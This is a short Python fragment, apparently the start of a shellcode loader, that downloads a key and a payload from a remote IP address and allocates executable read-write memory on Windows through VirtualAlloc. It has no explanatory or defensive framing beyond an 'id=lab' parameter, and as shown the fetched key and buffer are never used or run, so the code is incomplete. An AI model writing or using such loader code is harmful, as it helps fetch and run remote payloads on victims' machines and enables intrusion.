import ctypes, urllib.request
key = urllib.request.urlopen("http://198.51.100.55/getkey?id=lab").read()
data = urllib.request.urlopen("http://198.51.100.55/payload_url").read()
buf = ctypes.create_string_buffer(data, len(data))
ctypes.windll.kernel32.VirtualAlloc(None, len(data), 0x3000, 0x40)
